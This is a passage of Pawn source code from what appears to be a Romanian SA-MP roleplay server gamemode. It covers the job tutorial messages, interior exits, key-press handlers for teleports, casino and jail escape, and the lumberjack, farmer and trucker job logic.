	SendClientMessage(playerid, COLOR_YELLOW, "In primul rand, poti vedea statisticile la job prin accesarea comenzii /show.");
	switch job do {
		case 8: SendClientMessage(playerid, COLOR_YELLOW, "La acest nu primesti banii poti doar sa localizezi playeri de pe joc folosind comanda /find.");
		case 11,13,16: {
			SendClientMessage(playerid, COLOR_YELLOW, "Pentru a incepe sa muncesti foloseste, se foloseste comanda /fish.");
			SendClientMessage(playerid, COLOR_YELLOW, "Sunt sanse foarte mari sa prinzi un peste normal, sanse medii sa prinzi un rechin ce te omoara si sanse mici peste rar.");
			SendClientMessage(playerid, COLOR_YELLOW, "Suma pe care o castigi este random si in functie de skill");
			SendClientMessage(playerid, COLOR_YELLOW, "Dupa ce prinzi un peste, trebuie sa-l vinzi la un biz de tip 24/6 (/gps).");
		}
		default: SendClientMessage(playerid, COLOR_YELLOW, "Pentru a incepe sa muncesti foloseste, se foloseste comanda /startwork.");
	}
	TogglePlayerControllable(playerid, false);
	SetPlayerCameraPos(playerid, cameraJobPos[job-1][0], cameraJobPos[job-1][1], cameraJobPos[job-1][2]);
	SetPlayerCameraLookAt(playerid, cameraJobPos[job-1][3], cameraJobPos[job-1][4], cameraJobPos[job-1][5]);
	SetTimerEx("NextTut", 20000, false, "dd", playerid, job);
	return true;
}
redist::NextTut(playerid, job) {
	for(new i=0;i<20;i++) SendClientMessage(playerid, -1, "");
	SCMf(playerid, COLOR_YELLOW, "Tutorial Job %s: Vehicule in functie de skill (2/2)", JobInfo[job][jName]);
	switch(job) {
		case 5,6,8,11,13,16: SendClientMessage(playerid, COLOR_WHITE, "Acest job nu are vehicule.");
		default: SCMf(playerid, COLOR_YELLOW, "Skill 1: %s, Skill 2: %s, Skill 3: %s, Skill 4: %s, Skill 5: %s ", GetVehicleName(JobInfo[job][jSkill1Veh]), GetVehicleName(JobInfo[job][jSkill2Veh]), GetVehicleName(JobInfo[job][jSkill3Veh]), GetVehicleName(JobInfo[job][jSkill4Veh]), GetVehicleName(JobInfo[job][jSkill5Veh]));
	}
	SetTimerEx("tut_Finish", 20000, false, "d", playerid);
	return true;
}
redist::tut_Finish(playerid) {
	for(new i=0;i<20;i++) SendClientMessage(playerid, COLOR_LIGHTGOLD, "");
	SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- Tutorial Step 5/5 --");
	SendClientMessage(playerid, COLOR_LIGHTGOLD, "Tutorial finalizat! Ai fost transferat in lume virtuala normala.");
	switch(PlayerInfo[playerid][pJob]) {
		case 1: SendClientMessage(playerid, COLOR_LIGHTGOLD, "La acest job trebuie sa muncesti 60 secunde pentru a primi un sac de faina dupa il poti vinde la un biz de tip burger.");
		case 2: SendClientMessage(playerid, COLOR_LIGHTGOLD, "La acest job trebuie sa transporti trailere dintr-un oras in altul.");
		case 3: SendClientMessage(playerid, COLOR_LIGHTGOLD, "La acest job trebuie sa tai copaci.");
		case 4: SendClientMessage(playerid, COLOR_LIGHTGOLD, "La acest job trebuie sa trebuie sa aduni gunoiul.");
		case 8: SendClientMessage(playerid, COLOR_LIGHTGOLD, "La acest job poti localiza playerii folosind comanda /find.");
	}
	SendClientMessage(playerid, COLOR_LIGHTGOLD, "Daca mai ai intrebari legate de server nu ezita sa folosesti (/n) iar un helper iti va raspunde in cel mai scurt timp.");
	SendClientMessage(playerid, COLOR_LIGHTGOLD, "Panel & Forum: (/panel) respectiv (/forum).");
	SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- ");
	TogglePlayerControllable(playerid, true);
	SetCameraBehindPlayer(playerid);
	GameTextForPlayer(playerid, "Step: 5/5", 5000, 1);
	SetPlayerVirtualWorld(playerid, 0);
	SetVehicleVirtualWorld(VehicleRent[playerid], 0);
	PlayerInfo[playerid][pTutorial]++;
	UpdateVar(playerid, "Tutorial", PlayerInfo[playerid][pTutorial]);
	return true;
}

redist::skip_tut(playerid) {
	TogglePlayerControllable(playerid, true);
	SetCameraBehindPlayer(playerid);
	SetPlayerVirtualWorld(playerid, 0);
	PlayerInfo[playerid][pTutorial] = 5;
	UpdateVar(playerid, "Tutorial", PlayerInfo[playerid][pTutorial]);
	return true;
}
stock ExitFunction(playerid, i) {
	switch(InInterior[playerid]) {
		case INVALID_INTERIOR: return false;
		case HOUSE_INTERIOR: {
			if(Iter_Contains(RadioCount<PlayRadio[playerid]>, playerid)) Iter_Remove(RadioCount<PlayRadio[playerid]>, playerid);
			if(PlayerInfo[playerid][pSleeping]) return true;	
			if(!PlayerToPoint(2, playerid,HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz])) return true;
			SetPlayerPos(playerid,HouseInfo[i][hEntrancex],HouseInfo[i][hEntrancey],HouseInfo[i][hEntrancez]);
		}
		case BUSINESS_INTERIOR: {
			if(Iter_Contains(RadioCount<PlayRadio[playerid]>, playerid)) Iter_Remove(RadioCount<PlayRadio[playerid]>, playerid);
			if(!PlayerToPoint(2, playerid,BizzInfo[i][bExitX], BizzInfo[i][bExitY], BizzInfo[i][bExitZ])) return true;
			SetPlayerPos(playerid,BizzInfo[i][bEntranceX],BizzInfo[i][bEntranceY],BizzInfo[i][bEntranceZ]);
		}
		case HQ_INTERIOR: {
			if(!PlayerToPoint(2, playerid, DynamicFactions[i][fcX], DynamicFactions[i][fcY], DynamicFactions[i][fcZ])) return true;
			SetPlayerPos(playerid, DynamicFactions[i][extX], DynamicFactions[i][extY], DynamicFactions[i][extZ]);
		}
		case CLANHQ_INTERIOR: {
			if(!PlayerToPoint(2, playerid, ClanHQInfo[i][cEnterX], ClanHQInfo[i][cEnterY], ClanHQInfo[i][cEnterZ])) return true;
			SetPlayerPos(playerid, ClanHQInfo[i][cPosX], ClanHQInfo[i][cPosY], ClanHQInfo[i][cPosZ]);
		}
	}
	InInterior[playerid]=InInteriorID[playerid] = INVALID_INTERIOR; PlayRadio[playerid] = 0;
	SetPlayerInterior(playerid,0); StopAudioStreamForPlayer(playerid);
	SetPlayerVirtualWorld(playerid, PlayerInfo[playerid][pTutorial] >= 5 ? 0 : playerid + 10);
	return false;
}

redist::cutTree(playerid, index, obj) {
	DestroyDynamicObject(obj);
	RemovePlayerAttachedObject(playerid, 3);
	SetPlayerAttachedObject(playerid, 3, 1463, 1, 0.187385, 0.559032, -0.002791, 93.806076, 91.723266, 0.000000, 0.442207, 1.000000, 0.799356 );
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
	BagTime[playerid] = 30;
	InHand[playerid] = true;
	ClearAnimations(playerid);
	if(SpecialJobWorking[playerid] == true) { SCMf(playerid, COLOR_WHITE, "{75db3d}(Job) {FFFFFF}Mergi la vehiculul tau de la job si apasta tasta 'Y' pentru a pune lemnele, progres: %d/6.", CurseFacute[playerid]+1); }
	else { SCMf(playerid, COLOR_WHITE, "{75db3d}(Job) {FFFFFF}Mergi la vehiculul tau de la job si apasta tasta 'Y' pentru a pune lemnele, progres: %d/3.", CurseFacute[playerid]+1); }
	TreeObj[playerid][index] = 0;
	GameTextForPlayer(playerid, " ", 100, 3);
	return true;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys) {
    if((IsACBUGWeapon(playerid) && RELEASED(KEY_FIRE)) && newkeys != KEY_FIRE && newkeys & KEY_CROUCH) {
       ApplyAnimation ( playerid , "PED" , "getup" , 4.1 , 0 , 0 , 0 , 0 , 0 ) ;
       SendClientMessage(playerid,COLOR_WARNING,"Este interzis sa faci C-Bug, risti sa fii banat!");
    }
    switch oldkeys do {
    	case KEY_ANALOG_RIGHT,KEY_ANALOG_LEFT: RemovePlayerAttachedObject(playerid, 7);
    }
	if(newkeys & KEY_SECONDARY_ATTACK) {
	    if GetPlayerState(playerid) != PLAYER_STATE_ONFOOT *then return true;
	   	if(JobWorking[playerid]&&BagTime[playerid]&&(PlayerInfo[playerid][pJob]==11||PlayerInfo[playerid][pJob]==13||PlayerInfo[playerid][pJob]==16)) {
	   		DestroyDynamicPickup(_fishObj[playerid]);
	   		_fishObj[playerid]=0;
	   		BagTime[playerid] = 0;
	   		give_fish(playerid);
	   		return true;
		}
		new v = GetClosestVehicle(playerid);
		if(IsPlayerNearVehicle(playerid, v) && Iter_Contains(PlayerKeys[playerid], v)) SetVehicleParamsForPlayer(v, playerid, 0, 0);
		if(!player_selected[playerid] && InInterior[playerid] == BUSINESS_INTERIOR) {
			new f=-1;
			while(++f<sizeof(machine_pos)) {
				if(IsPlayerInRangeOfPoint(playerid, 2.0, machine_pos[f][0], machine_pos[f][1], machine_pos[f][2])) {
					if(ServerSystem[12]) return SendClientMessage(playerid, -1, "INFO: Sistem dezactivat de un administrator!");
					showMachine(playerid);
					return true;
				}
			}
			if(PlayerToPoint(15.0, playerid, 2197.5576,1603.7146,1005.0625)) {
			 	if !PlayerInfo[playerid][pReborn] *then 
			 		return SendClientMessage(playerid, -1, "Ai nevoie de gradul de reborn.");

				for(new i=0;i<17;i++) TextDrawShowForPlayer(playerid, RoulettaTD[i]);
				SelectTextDraw(playerid, COLOR_WHITE);
				player_selected[playerid] = 20;
				if(!Iter_Count(IsRuletta)) {
					RulettStatus = 1;
					RulettaTime[0] = 15;
					RulettaTime[2] = RandomEx(25, 35) + (gettime() % 2);
				}
				Iter_Add(IsRuletta, playerid);
				return true;
			}
			for(new i=0,j=sizeof _jack;i!=j;i++) if PlayerToPoint(2.0, playerid, _jack[i], 1630.495361, 1008.3) *then return show_player_blackjack(playerid, i);
		} 
		if GetPlayerVirtualWorld(playerid) == 1339 *then {
			if PlayerToPoint(3.0, playerid, 60.9194,2529.7881,17.2395) *then
				return SetPlayerPos(playerid, 54.1488,2535.8706,210.6389),SetPlayerFreeze(playerid, 1);

			if PlayerToPoint(3.0, playerid, 54.1488,2535.8706,210.6389) *then
				SetPlayerPos(playerid, 60.9194,2529.7881,17.2395);

			if PlayerToPoint(3.0, playerid, 49.5273,2522.3716,210.6388) *then
				return SetPlayerPos(playerid, 364.9753,-11.8444,1001.8516), SetPlayerInterior(playerid, 9); 

			if PlayerToPoint(3.0, playerid, 364.9753,-11.8444,1001.8516) *then
				return SetPlayerPos(playerid, 49.5273,2522.3716,210.6388),			   		
				SetPlayerInterior(playerid, 0), SetPlayerFreeze(playerid, 1); 		   			

			if PlayerToPoint(3.0, playerid, 58.53694,2526.1118,210.6388) *then
				return SetPlayerPos(playerid, 2234.0684,1714.1119,1012.34560), SetPlayerInterior(playerid, 1); 

			if PlayerToPoint(3.0, playerid, 2234.0684,1714.1119,1012.3456) *then
				return SetPlayerPos(playerid, 58.5394,2526.1118,210.6388),
				SetPlayerInterior(playerid, 0), SetPlayerFreeze(playerid, 1); 

			if PlayerToPoint(3.0, playerid, 53.6505,2508.6016,210.6388) && Escape[playerid] == 0 && PlayerInfo[playerid][pJailTime] >= 1 *then
				return ShowPlayerDialog(playerid, DIALOG_ESCAPE, DIALOG_STYLE_MSGBOX, "Escape", "Vrei sa evadezi?\nAi nevoie de 10 puncte de escape.", "Da", "Nu");
		}
		if GetPlayerInterior(playerid) == 4 *then {
			if PlayerToPoint(1.0, playerid, 301.8574,-76.9573,1001.5156) *then 
				return SetPlayerPos(playerid, 301.6933,-75.4410,1001.5156);

			if PlayerToPoint(1.0, playerid, 301.6933,-75.4410,1001.5156) *then 
				return SetPlayerPos(playerid, 301.8574,-76.9573,1001.5156);

			if PlayerToPoint(1.0, playerid, 302.8040,-57.6479,1001.5156) *then 
				return SetPlayerPos(playerid, 304.3640,-57.6372,1001.5156);

			if PlayerToPoint(1.0, playerid, 304.3640,-57.6372,1001.5156) *then 
				return SetPlayerPos(playerid, 302.8040,-57.6479,1001.5156);
		}
		if UsedFly[playerid] *then {
			StopFly(playerid);
			UsedFly[playerid] = 0;
			SetPlayerHealthEx(playerid, 99);
			ClearAnimations(playerid);
			SendClientMessage(playerid, 0xFFADADFF, "Fly mode off.");
			return true;
		}	 
		if PlayerToPoint(2, playerid,257.5646,83.3177,1002.4453) && IsACop(playerid) *then {
			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerPos(playerid, 1918.2250,-1619.8477,1770.7469);
			SetPlayerInterior(playerid, 0);
			TogglePlayerControllable(playerid, 0);
			ClearAnimations(playerid);
			SetPlayerFreeze(playerid, 2);	
			return true;				
		}		
		if PlayerToPoint(2, playerid,1918.2250,-1619.8477,1770.7469) *then {
			if(IsACop(playerid)) ShowPlayerDialog(playerid, DIALOG_TELEPORT, DIALOG_STYLE_LIST, "Teleport", "Enter Yard\nExit jail", "Select", "Cancel");
			else {
				SetPlayerVirtualWorld(playerid, 1339);
				SetPlayerPos(playerid, -34.4762,2506.6443,17.2743);
				SetPlayerInterior(playerid, 0);
			}	
		}
		if ExitFunction(playerid, InInteriorID[playerid]) *then return true;		   	
		if EnterFunction(playerid) *then return true;			    
		if PlayerToPoint(2.0, playerid,1671.9180,-1328.6810,17.4482) *then  {
		   if !areape *then return SendClientMessage(playerid,COLOR_WHITE,"Arena de evente este inchisa.");
	       SetPlayerInterior(playerid,15);
		   SetPlayerPos(playerid,-1423.5153,935.8321,1036.4756);
		   return true;
		}
		if PlayerToPoint(2.0, playerid,-1423.5153,935.8321,1036.4756) *then {
	       SetPlayerInterior(playerid,0);
		   SetPlayerPos(playerid,1671.9180,-1328.6810,17.4482);
		   return true;
		}
		//fabrica de mobila
		if(PlayerToPoint(2.0, playerid, -745.2135,-128.5671,66.0922)&&PlayerInfo[playerid][pJob]==3&&JobWorking[playerid]&&SpecialJobWorking[playerid]&&!BlockEnter[playerid]) {
	       SetPlayerInterior(playerid,1);
		   SetPlayerPos(playerid,964.9836,2108.0752,1011.0303);
		   return true;
		}// - intrare
		if(PlayerToPoint(2.0, playerid, 964.9836,2108.0752,1011.0303)) {
	       SetPlayerInterior(playerid, 0);
		   SetPlayerPos(playerid, -745.2135,-128.5671,66.0922);
		   return true;
		}// - iesire	   
	}
	if(newkeys & KEY_ANALOG_LEFT) {
		if PlayerInfo[playerid][pKeyEmote][0]==-1 *then return true;
		switch PlayerInfo[playerid][pKeyEmote][0] do {
			case 0: SetPlayerAttachedObject(playerid, 7, 1212, 2, 0.2640, -0.0379, -0.0050, 42.1999, 82.6001, 48.2999, 1.0000, 1.0000, 1.0000);
			case 1: SetPlayerAttachedObject(playerid, 7, 1240, 2, 0.3679, -0.0130, 0.0220, 0.0000, 84.3000, -5.5999, 1.0000, 1.0000, 1.0000);
			case 2: SetPlayerAttachedObject(playerid, 7, 1274, 2, 0.3759, -0.0120, 0.0000, 0.0000, 90.8999, 0.0000, 1.0000, 1.0000, 1.0000);
			case 3: SetPlayerAttachedObject(playerid, 7, 1254, 2, 0.4039, 0.0000, 0.0190, 0.0000, 86.0999, 0.0000, 1.0000, 1.0000, 1.0000);
			case 4: SetPlayerAttachedObject(playerid, 7, 18631, 2, 0.4139, -0.0180, 0.0329, 0.0000, 81.9999, 0.0000, 1.0000, 1.0000, 1.0000);
			case 5: SetPlayerAttachedObject(playerid, 7, 1247, 2, 0.4209, -0.0190, 0.0049, 0.0000, 27.4999, 0.0000, 1.0000, 1.0000, 1.0000);
			case 6: SetPlayerAttachedObject(playerid, 7, 1654, 2, 0.4629, 0.0160, -0.0030, 0.0000, 87.6999, 177.4999, 1.0000, 1.0000, 1.0000);
			case 7: SetPlayerAttachedObject(playerid, 7, 2061, 2, 0.5110, -0.0200, 0.0180, 0.0000, 87.5999, 0.0000, 1.0000, 1.0000, 1.0000);
			case 8: SetPlayerAttachedObject(playerid, 7, 1276, 2, 0.6229, 0.0000, 0.0000, -88.6999, 76.0999, 1.6999, 1.0000, 1.0000, 1.0000);
			case 9: SetPlayerAttachedObject(playerid, 7, 362, 2, 0.4679, -0.3569, -0.0049, 73.7000, 92.4000, 18.7999, 1.0000, 1.0000, 1.0000);
			case 10: SetPlayerAttachedObject(playerid, 7, 19320, 2, 0.3679, -0.0130, 0.0220, 0.0000, 84.3000, -5.5999, 1.0000, 1.0000, 1.0000);
		}
	}
	if(newkeys & KEY_ANALOG_RIGHT) {
		if PlayerInfo[playerid][pKeyEmote][0]==-1 *then return true;
		switch PlayerInfo[playerid][pKeyEmote][1] do {
			case 0: SetPlayerAttachedObject(playerid, 7, 1212, 2, 0.2640, -0.0379, -0.0050, 42.1999, 82.6001, 48.2999, 1.0000, 1.0000, 1.0000);
			case 1: SetPlayerAttachedObject(playerid, 7, 1240, 2, 0.3679, -0.0130, 0.0220, 0.0000, 84.3000, -5.5999, 1.0000, 1.0000, 1.0000);
			case 2: SetPlayerAttachedObject(playerid, 7, 1274, 2, 0.3759, -0.0120, 0.0000, 0.0000, 90.8999, 0.0000, 1.0000, 1.0000, 1.0000);
			case 3: SetPlayerAttachedObject(playerid, 7, 1254, 2, 0.4039, 0.0000, 0.0190, 0.0000, 86.0999, 0.0000, 1.0000, 1.0000, 1.0000);
			case 4: SetPlayerAttachedObject(playerid, 7, 18631, 2, 0.4139, -0.0180, 0.0329, 0.0000, 81.9999, 0.0000, 1.0000, 1.0000, 1.0000);
			case 5: SetPlayerAttachedObject(playerid, 7, 1247, 2, 0.4209, -0.0190, 0.0049, 0.0000, 27.4999, 0.0000, 1.0000, 1.0000, 1.0000);
			case 6: SetPlayerAttachedObject(playerid, 7, 1654, 2, 0.4629, 0.0160, -0.0030, 0.0000, 87.6999, 177.4999, 1.0000, 1.0000, 1.0000);
			case 7: SetPlayerAttachedObject(playerid, 7, 2061, 2, 0.5110, -0.0200, 0.0180, 0.0000, 87.5999, 0.0000, 1.0000, 1.0000, 1.0000);
			case 8: SetPlayerAttachedObject(playerid, 7, 1276, 2, 0.6229, 0.0000, 0.0000, -88.6999, 76.0999, 1.6999, 1.0000, 1.0000, 1.0000);
			case 9: SetPlayerAttachedObject(playerid, 7, 362, 2, 0.4679, -0.3569, -0.0049, 73.7000, 92.4000, 18.7999, 1.0000, 1.0000, 1.0000);
			case 10: SetPlayerAttachedObject(playerid, 7, 19320, 2, 0.3679, -0.0130, 0.0220, 0.0000, 84.3000, -5.5999, 1.0000, 1.0000, 1.0000);
		}
	}
	if(newkeys & KEY_SPRINT) {
		if(Spectate[playerid] != -1) {
			if(Iter_Count(Player)-Iter_Count(Staff<ADMIN>) < 3) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu au fost gasiti suficienti jucatori!");	

			new players[MAX_PLAYERS],maxx=0;
			foreach(new p: Player) if PlayerInfo[p][pAdmin] < PlayerInfo[playerid][pAdmin] && playerid != p *then players[maxx++]=p;
			new id = players[random(maxx)];
			setPlayerSpec(playerid, id);		
		}
	}
	if(newkeys & KEY_FIRE) {
		if(PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8 || PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pLeader] == 22) TTCFunction(playerid); 
        if(EnableBoast[playerid] == 1 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
			new Float:vx,Float:vy,Float:vz;
			GetVehicleVelocity(GetPlayerVehicleID(playerid),vx,vy,vz);
			SetVehicleVelocity(GetPlayerVehicleID(playerid), vx * 1.8, vy *1.8, vz * 1.8);
        }	
	}
	if(newkeys & KEY_YES) {
		#if defined QUEST_AUTUMN
			checkObjectInRange(playerid);
		#endif
		if(JobWorking[playerid]) {
			new Float:rx,Float:ry,Float:rz;
			GetPlayerPos(playerid, rx, ry, rz);
			new int = GetPlayerInterior(playerid);

			switch(PlayerInfo[playerid][pJob]) {
				case 1: {
					if(JobWorking[playerid]!=2||!InHand[playerid]||GetVehicleDistanceFromPoint(JobVehicle[playerid], rx, ry, rz) > 5.0) return true;
					RemovePlayerAttachedObject(playerid, 4);
					InHand[playerid] = false;
					CurseFacute[playerid] ++;
					if(CurseFacute[playerid]>=4) {
						SCMf(playerid, COLOR_WHITE, "{75db3d}(Farmer Job) {FFFFFF}Mergi la fabrica de lapte pentru a transporta laptele, distanta: %.1fm.", GetPlayerDistanceFromPoint(playerid, -110.6082,-219.7165,1.4219));
						SetPlayerCheckpoint(playerid, -110.6082,-219.7165,1.4219, 2.0);
						CP[playerid] = 719;
						return true;	
					}
					new r = random(sizeof vaca_cp);
					SetPlayerCheckpoint(playerid, vaca_cp[r][0], vaca_cp[r][1], vaca_cp[r][2], 2.0);
					SCMf(playerid, COLOR_WHITE, "{75db3d}(Farmer Job) {FFFFFF}Distanta pana la urmatoarea vaca: %.1fm.", GetPlayerDistanceFromPoint(playerid, vaca_cp[r][0], vaca_cp[r][1], vaca_cp[r][2]));
					CP[playerid] = 718;
					return true;
				}
				case 2: {
					if(JobWorking[playerid]!=2||!InHand[playerid]||GetVehicleDistanceFromPoint(JobVehicle[playerid], rx, ry, rz) > 5.0) return true;
					RemovePlayerAttachedObject(playerid, 4);
					InHand[playerid] = false;
					CurseFacute[playerid] ++;
					SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
					if(CurseFacute[playerid]>=4) {
						SCMf(playerid, COLOR_WHITE, "{75db3d}(Trucker Job) {FFFFFF}Mergi la checkpoint pentru a transporta pietrele, distanta: %.1fm.", GetPlayerDistanceFromPoint(playerid, -2457.2234,2294.0862,4.9844));
						SetPlayerCheckpoint(playerid, -2457.2234,2294.0862,4.9844, 5.0);
						CP[playerid] = 721;
						return true;	
					}
					new r = MoneyEarned[playerid] = random(sizeof stone_object);
					SetPlayerCheckpoint(playerid, stone_object[r][0], stone_object[r][1], stone_object[r][2], 2.0);
					SCMf(playerid, COLOR_WHITE, "{75db3d}(Trucker Job) {FFFFFF}Distanta pana la urmatoarea piatra: %.1fm.", GetPlayerDistanceFromPoint(playerid, stone_object[r][0], stone_object[r][1], stone_object[r][2]));
					CP[playerid] = 720;
					return true;
				}
				case 3: {
					//special work
					if(SpecialJobWorking[playerid]&&StatusJob[playerid]==1) {
						if(GetVehicleDistanceFromPoint(JobVehicle[playerid], rx, ry, rz) > 5.0) return true;
						switch(CurseFacute[playerid]) {
							case 1: {
								DestroyDynamicObject(LumberjackObject[playerid][0]);
								StatusJob[playerid]=2;
								showInfo(playerid, "Apasa tasta ~y~Y ~w~langa vehicul pentru a lua mobila iar apoi pune-o in checkpoint.", 6);
								ClearAnimations(playerid);
								SetPlayerAttachedObject(playerid, 4, 2133, 1, 0.0000, 0.5090, -0.0020, 0.0000, 91.8999, 0.0000, 1.0000, 1.0000, 1.0000);
								SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
								ApplyAnimation(playerid, "CARRY", "liftup05", 4.1, 0, 1, 1, 0, 0);
								InHand[playerid] = true;
							}
							case 2: {
								DestroyDynamicObject(LumberjackObject[playerid][1]);
								StatusJob[playerid]=2;
								showInfo(playerid, "Apasa tasta ~y~Y ~w~langa vehicul pentru a lua mobila iar apoi pune-o in checkpoint.", 6);
								ClearAnimations(playerid);
								SetPlayerAttachedObject(playerid, 4, 1758, 1, 0.0000, 0.5090, -0.0020, 0.0000, 91.8999, 0.0000, 1.0000, 1.0000, 1.0000);
								SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
								ApplyAnimation(playerid, "CARRY", "liftup05", 4.1, 0, 1, 1, 0, 0);
								InHand[playerid] = true;
							}
							case 3: {
								DestroyDynamicObject(LumberjackObject[playerid][2]);
								StatusJob[playerid]=2;
								showInfo(playerid, "Apasa tasta ~y~Y ~w~langa vehicul pentru a lua mobila iar apoi pune-o in checkpoint.", 6);
								ClearAnimations(playerid);
								SetPlayerAttachedObject(playerid, 4, 2029, 1, 0.0000, 0.5090, -0.0020, 0.0000, 91.8999, 0.0000, 1.0000, 1.0000, 1.0000);
								SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
								ApplyAnimation(playerid, "CARRY", "liftup05", 4.1, 0, 1, 1, 0, 0);
								InHand[playerid] = true;
							}
							case 4: {
								DestroyDynamicObject(LumberjackObject[playerid][3]);
								StatusJob[playerid]=2;
								showInfo(playerid, "Apasa tasta ~y~Y ~w~langa vehicul pentru a lua mobila iar apoi pune-o in checkpoint.", 6);
								ClearAnimations(playerid);
								SetPlayerAttachedObject(playerid, 4, 1723, 1, 0.0000, 0.5090, -0.0020, 0.0000, 91.8999, 0.0000, 1.0000, 1.0000, 1.0000);
								SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
								ApplyAnimation(playerid, "CARRY", "liftup05", 4.1, 0, 1, 1, 0, 0);
								InHand[playerid] = true;
							}
							case 5: {
								DestroyDynamicObject(LumberjackObject[playerid][4]);
								StatusJob[playerid]=2;
								showInfo(playerid, "Apasa tasta ~y~Y ~w~langa vehicul pentru a lua mobila iar apoi pune-o in checkpoint.", 6);
								ClearAnimations(playerid);
								SetPlayerAttachedObject(playerid, 4, 2109, 1, 0.0000, 0.5090, -0.0020, 0.0000, 91.8999, 0.0000, 1.0000, 1.0000, 1.0000);
								SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
								ApplyAnimation(playerid, "CARRY", "liftup05", 4.1, 0, 1, 1, 0, 0);
								InHand[playerid] = true;
							}
						}
						return true;
					}
					if(SpecialJobWorking[playerid]&&StatusJob[playerid]==2) {
						if(!IsPlayerInCheckpoint(playerid)) return true;

						switch(CurseFacute[playerid]++) {
							case 1: {
								StatusJob[playerid] = 1;
								RemovePlayerAttachedObject(playerid, 4);
								SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
								InHand[playerid] = false;
							}
							case 2: {
								StatusJob[playerid] = 1;
								RemovePlayerAttachedObject(playerid, 4);
								SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
								InHand[playerid] = false;
							}
							case 3: {
								StatusJob[playerid] = 1;
								RemovePlayerAttachedObject(playerid, 4);
								SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
								InHand[playerid] = false;
							}
							case 4: {
								StatusJob[playerid] = 1;
								RemovePlayerAttachedObject(playerid, 4);
								SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
								InHand[playerid] = false;
							}
							case 5: {
								StatusJob[playerid] = 1;
								RemovePlayerAttachedObject(playerid, 4);
								SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
								InHand[playerid] = false;
								DisablePlayerCheckpoint(playerid);

								gString[0] = EOS;
								format(gString, sizeof(gString), "Ai descarcat cu succes mobila.~n~Intoarce-te inapoi la job pentru a primi salariul.~n~~y~(distanta: %.2fm)", GetPlayerDistanceFromPoint(playerid, -545.7882,-1024.5519,24.8210));
								showInfo(playerid, gString, 6);
								CP[playerid] = 702;
								SetPlayerCheckpoint(playerid, -545.7882,-1024.5519,24.8210, 5.0);
							}
						}
						return true;
					}
					if(SpecialJobWorking[playerid]&&int==1&&IsPlayerInRangeOfPoint(playerid, 2, 942.2797,2117.9023,1011.0303)&&!InHand[playerid]) {
						switch(CurseFacute[playerid]++) {
							case 0: {
								ClearAnimations(playerid);
								DestroyDynamicObject(LumberObj[playerid][0]);
								//SetPlayerAttachedObject(playerid, 4, 2133, 6, 0.4200, 0.1710, -0.1630, 150.5000, 0.0000, 113.7999, 1.0000, 1.0000, 1.0000);
								SetPlayerAttachedObject(playerid, 4, 2133, 1, 0.0000, 0.5090, -0.0020, 0.0000, 91.8999, 0.0000, 1.0000, 1.0000, 1.0000);
								SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
								ApplyAnimation(playerid, "CARRY", "liftup05", 4.1, 0, 1, 1, 0, 0);
								InHand[playerid] = true;
			    				showInfo(playerid, "Mergi la vehicul pentru a descarca mobila.~n~Nu uita sa apesi tasta ~y~Y ~w~pentru a descarca mobila in vehicul.", 6);
							}
							case 1: {
								ClearAnimations(playerid);
								DestroyDynamicObject(LumberObj[playerid][1]);
								SetPlayerAttachedObject(playerid, 4, 1758, 6, 0.4200, 0.1710, -0.1630, 150.5000, 0.0000, 113.7999, 1.0000, 1.0000, 1.0000);
								SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
								ApplyAnimation(playerid, "CARRY", "liftup05", 4.1, 0, 1, 1, 0, 0);
								InHand[playerid] = true;
			    				showInfo(playerid, "Mergi la vehicul pentru a descarca mobila.~n~Nu uita sa apesi tasta ~y~Y ~w~pentru a descarca mobila in vehicul.", 6);
							}
							case 2: {
								ClearAnimations(playerid);
								DestroyDynamicObject(LumberObj[playerid][2]);
								//SetPlayerAttachedObject(playerid, 4, 2029, 6, 0.4200, 0.1710, -0.1630, 150.5000, 0.0000, 113.7999, 1.0000, 1.0000, 1.0000);
								SetPlayerAttachedObject(playerid, 4, 2029, 1, 0.0000, 0.5090, -0.0020, 0.0000, 91.8999, 0.0000, 1.0000, 1.0000, 1.0000);
								SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
								ApplyAnimation(playerid, "CARRY", "liftup05", 4.1, 0, 1, 1, 0, 0);
								InHand[playerid] = true;
			    				showInfo(playerid, "Mergi la vehicul pentru a descarca mobila.~n~Nu uita sa apesi tasta ~y~Y ~w~pentru a descarca mobila in vehicul.", 6);
							}
							case 3: {
								ClearAnimations(playerid);
								DestroyDynamicObject(LumberObj[playerid][3]);
								//SetPlayerAttachedObject(playerid, 4, 1703, 6, 0.4200, 0.1710, -0.1630, 150.5000, 0.0000, 113.7999, 1.0000, 1.0000, 1.0000);
								SetPlayerAttachedObject(playerid, 4, 1703, 1, 0.0000, 0.5090, -0.0020, 0.0000, 91.8999, 0.0000, 1.0000, 1.0000, 1.0000);
								SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
								ApplyAnimation(playerid, "CARRY", "liftup05", 4.1, 0, 1, 1, 0, 0);
								InHand[playerid] = true;
			    				showInfo(playerid, "Mergi la vehicul pentru a descarca mobila.~n~Nu uita sa apesi tasta ~y~Y ~w~pentru a descarca mobila in vehicul.", 6);
							}	
							case 4: {
								ClearAnimations(playerid);
								DestroyDynamicObject(LumberObj[playerid][4]);
